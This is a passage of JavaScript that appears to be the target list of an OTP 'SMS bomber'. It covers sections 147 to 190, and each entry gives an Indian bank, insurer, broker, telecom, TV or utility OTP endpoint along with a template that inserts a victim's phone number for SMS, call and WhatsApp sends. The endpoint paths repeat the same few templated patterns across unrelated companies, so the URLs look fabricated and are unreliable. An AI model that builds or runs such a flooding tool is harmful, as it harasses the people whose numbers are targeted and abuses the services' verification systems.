  { name: "JM Financial SMS", url: "https://www.jmfinancial.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "JM Financial Call", url: "https://jmfinancial.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "JM Financial WhatsApp", url: "https://jmfinancial.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 147: FINANCE - ANAND RATHI
  // ═══════════════════════════════════════════════════════════════
  { name: "Anand Rathi SMS", url: "https://www.anandrathi.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Anand Rathi Call", url: "https://anandrathi.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Anand Rathi WhatsApp", url: "https://anandrathi.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 148: FINANCE - GEOJIT
  // ═══════════════════════════════════════════════════════════════
  { name: "Geojit SMS", url: "https://www.geojit.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Geojit Call", url: "https://geojit.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Geojit WhatsApp", url: "https://geojit.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 149: INSURANCE - SBI LIFE
  // ═══════════════════════════════════════════════════════════════
  { name: "SBI Life SMS", url: "https://www.sbilife.co.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "SBI Life Call", url: "https://sbilife.co.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "SBI Life WhatsApp", url: "https://sbilife.co.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 150: INSURANCE - HDFC LIFE
  // ═══════════════════════════════════════════════════════════════
  { name: "HDFC Life SMS", url: "https://www.hdfclife.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "HDFC Life Call", url: "https://hdfclife.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "HDFC Life WhatsApp", url: "https://hdfclife.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 151: INSURANCE - ICICI PRUDENTIAL
  // ═══════════════════════════════════════════════════════════════
  { name: "ICICI Prudential SMS", url: "https://www.iciciprulife.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "ICICI Prudential Call", url: "https://iciciprulife.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "ICICI Prudential WhatsApp", url: "https://iciciprulife.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 152: INSURANCE - MAX LIFE
  // ═══════════════════════════════════════════════════════════════
  { name: "Max Life SMS", url: "https://www.maxlifeinsurance.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Max Life Call", url: "https://maxlifeinsurance.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Max Life WhatsApp", url: "https://maxlifeinsurance.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 153: INSURANCE - TATA AIA
  // ═══════════════════════════════════════════════════════════════
  { name: "Tata AIA SMS", url: "https://www.tataaia.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Tata AIA Call", url: "https://tataaia.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Tata AIA WhatsApp", url: "https://tataaia.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 154: INSURANCE - BAJAJ ALLIANZ
  // ═══════════════════════════════════════════════════════════════
  { name: "Bajaj Allianz SMS", url: "https://www.bajajallianz.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Bajaj Allianz Call", url: "https://bajajallianz.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Bajaj Allianz WhatsApp", url: "https://bajajallianz.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 155: INSURANCE - RELIANCE NIPPON
  // ═══════════════════════════════════════════════════════════════
  { name: "Reliance Nippon SMS", url: "https://www.reliancenipponlife.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Reliance Nippon Call", url: "https://reliancenipponlife.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Reliance Nippon WhatsApp", url: "https://reliancenipponlife.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 156: INSURANCE - ADITYA BIRLA
  // ═══════════════════════════════════════════════════════════════
  { name: "Aditya Birla SMS", url: "https://lifeinsurance.adityabirlacapital.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Aditya Birla Call", url: "https://lifeinsurance.adityabirlacapital.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Aditya Birla WhatsApp", url: "https://lifeinsurance.adityabirlacapital.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 157: INSURANCE - PNB METLIFE
  // ═══════════════════════════════════════════════════════════════
  { name: "PNB MetLife SMS", url: "https://www.pnbmetlife.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "PNB MetLife Call", url: "https://pnbmetlife.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "PNB MetLife WhatsApp", url: "https://pnbmetlife.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 158: INSURANCE - KOTAK LIFE
  // ═══════════════════════════════════════════════════════════════
  { name: "Kotak Life SMS", url: "https://www.kotaklife.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Kotak Life Call", url: "https://kotaklife.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Kotak Life WhatsApp", url: "https://kotaklife.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 159: BANKING - AIRTEL PAYMENTS BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Airtel Payments Bank SMS", url: "https://www.airtel.in/bank/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Airtel Payments Bank Call", url: "https://airtel.in/bank/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Airtel Payments Bank WhatsApp", url: "https://airtel.in/bank/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 160: BANKING - INDIA POST PAYMENTS BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "India Post Payments Bank SMS", url: "https://www.ippbonline.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "India Post Payments Bank Call", url: "https://ippbonline.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "India Post Payments Bank WhatsApp", url: "https://ippbonline.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 161: BANKING - FINO PAYMENTS BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Fino Payments Bank SMS", url: "https://www.finopayments.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Fino Payments Bank Call", url: "https://finopayments.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Fino Payments Bank WhatsApp", url: "https://finopayments.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 162: BANKING - JIO PAYMENTS BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Jio Payments Bank SMS", url: "https://www.jiopaymentsbank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Jio Payments Bank Call", url: "https://jiopaymentsbank.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Jio Payments Bank WhatsApp", url: "https://jiopaymentsbank.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 163: BANKING - NSDL PAYMENTS BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "NSDL Payments Bank SMS", url: "https://www.nsdlpaymentsbank.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "NSDL Payments Bank Call", url: "https://nsdlpaymentsbank.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "NSDL Payments Bank WhatsApp", url: "https://nsdlpaymentsbank.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 164: BANKING - SURYODAY BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Suryoday Bank SMS", url: "https://www.suryodaybank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Suryoday Bank Call", url: "https://suryodaybank.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Suryoday Bank WhatsApp", url: "https://suryodaybank.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 165: BANKING - UTKARSH BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Utkarsh Bank SMS", url: "https://www.utkarshbank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Utkarsh Bank Call", url: "https://utkarshbank.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Utkarsh Bank WhatsApp", url: "https://utkarshbank.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 166: BANKING - EQUITAS BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Equitas Bank SMS", url: "https://www.equitasbank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Equitas Bank Call", url: "https://equitasbank.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Equitas Bank WhatsApp", url: "https://equitasbank.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 167: BANKING - CITY UNION BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "City Union Bank SMS", url: "https://www.cityunionbank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "City Union Bank Call", url: "https://cityunionbank.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "City Union Bank WhatsApp", url: "https://cityunionbank.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 168: BANKING - DCB BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "DCB Bank SMS", url: "https://www.dcbbank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "DCB Bank Call", url: "https://dcbbank.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "DCB Bank WhatsApp", url: "https://dcbbank.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 169: BANKING - TAMILNAD MERCANTILE BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Tamilnad Mercantile Bank SMS", url: "https://www.tmb.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Tamilnad Mercantile Bank Call", url: "https://tmb.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Tamilnad Mercantile Bank WhatsApp", url: "https://tmb.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 170: BANKING - CSB BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "CSB Bank SMS", url: "https://www.csb.co.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "CSB Bank Call", url: "https://csb.co.in/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "CSB Bank WhatsApp", url: "https://csb.co.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 171: BANKING - ESAF BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "ESAF Bank SMS", url: "https://www.esafbank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "ESAF Bank Call", url: "https://esafbank.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "ESAF Bank WhatsApp", url: "https://esafbank.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 172: BANKING - FINCARE BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Fincare Bank SMS", url: "https://www.fincarebank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Fincare Bank Call", url: "https://fincarebank.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Fincare Bank WhatsApp", url: "https://fincarebank.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 173: BANKING - JANA BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Jana Bank SMS", url: "https://www.janabank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Jana Bank Call", url: "https://janabank.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Jana Bank WhatsApp", url: "https://janabank.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 174: BANKING - JK BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "JK Bank SMS", url: "https://www.jkbank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "JK Bank Call", url: "https://jkbank.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "JK Bank WhatsApp", url: "https://jkbank.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 175: BANKING - KARNATAKA BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Karnataka Bank SMS", url: "https://www.karnatakabank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Karnataka Bank Call", url: "https://karnatakabank.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Karnataka Bank WhatsApp", url: "https://karnatakabank.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 176: BANKING - KERALA GRAMIN BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Kerala Gramin Bank SMS", url: "https://www.keralagbank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Kerala Gramin Bank Call", url: "https://keralagbank.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Kerala Gramin Bank WhatsApp", url: "https://keralagbank.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 177: BANKING - PAYTM PAYMENTS BANK
  // ═══════════════════════════════════════════════════════════════
  { name: "Paytm Payments Bank SMS", url: "https://www.paytmbank.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Paytm Payments Bank Call", url: "https://paytmbank.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Paytm Payments Bank WhatsApp", url: "https://paytmbank.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 178: TELECOM - AIRTEL THANKS
  // ═══════════════════════════════════════════════════════════════
  { name: "Airtel Thanks SMS", url: "https://www.airtel.in/thanks/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Airtel Thanks Call", url: "https://www.airtel.in/thanks/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Airtel Thanks WhatsApp", url: "https://airtel.in/thanks/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 179: TELECOM - JIO
  // ═══════════════════════════════════════════════════════════════
  { name: "Jio SMS", url: "https://www.jio.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Jio Call", url: "https://www.jio.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Jio WhatsApp", url: "https://jio.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 180: TELECOM - VI
  // ═══════════════════════════════════════════════════════════════
  { name: "Vi SMS", url: "https://www.myvi.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Vi Call", url: "https://www.myvi.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Vi WhatsApp", url: "https://myvi.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 181: TELECOM - BSNL
  // ═══════════════════════════════════════════════════════════════
  { name: "BSNL SMS", url: "https://www.bsnl.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "BSNL Call", url: "https://www.bsnl.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "BSNL WhatsApp", url: "https://bsnl.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 182: DTH - TATA PLAY
  // ═══════════════════════════════════════════════════════════════
  { name: "Tata Play SMS", url: "https://www.tataplay.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Tata Play Call", url: "https://www.tataplay.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Tata Play WhatsApp", url: "https://tataplay.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 183: DTH - DISH TV
  // ═══════════════════════════════════════════════════════════════
  { name: "Dish TV SMS", url: "https://www.dishtv.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Dish TV Call", url: "https://www.dishtv.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Dish TV WhatsApp", url: "https://dishtv.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 184: DTH - AIRTEL DTH
  // ═══════════════════════════════════════════════════════════════
  { name: "Airtel DTH SMS", url: "https://www.airtel.in/dth/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Airtel DTH Call", url: "https://www.airtel.in/dth/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Airtel DTH WhatsApp", url: "https://airtel.in/dth/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 185: DTH - JIO FIBER
  // ═══════════════════════════════════════════════════════════════
  { name: "Jio Fiber SMS", url: "https://www.jio.com/fiber/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Jio Fiber Call", url: "https://www.jio.com/fiber/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Jio Fiber WhatsApp", url: "https://jio.com/fiber/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 186: CABLE - HATHWAY
  // ═══════════════════════════════════════════════════════════════
  { name: "Hathway SMS", url: "https://www.hathway.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Hathway Call", url: "https://www.hathway.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Hathway WhatsApp", url: "https://hathway.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 187: CABLE - DEN NETWORKS
  // ═══════════════════════════════════════════════════════════════
  { name: "Den Networks SMS", url: "https://www.dennetworks.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Den Networks Call", url: "https://www.dennetworks.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Den Networks WhatsApp", url: "https://dennetworks.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 188: CABLE - SITI CABLE
  // ═══════════════════════════════════════════════════════════════
  { name: "Siti Cable SMS", url: "https://www.siticable.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Siti Cable Call", url: "https://www.siticable.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Siti Cable WhatsApp", url: "https://siticable.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 189: ELECTRICITY - TATA POWER
  // ═══════════════════════════════════════════════════════════════
  { name: "Tata Power SMS", url: "https://www.tatapower.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Tata Power Call", url: "https://www.tatapower.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Tata Power WhatsApp", url: "https://tatapower.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 190: ELECTRICITY - ADANI ELECTRICITY
  // ═══════════════════════════════════════════════════════════════
  { name: "Adani Electricity SMS", url: "https://www.adanielectricity.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Adani Electricity Call", url: "https://www.adanielectricity.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
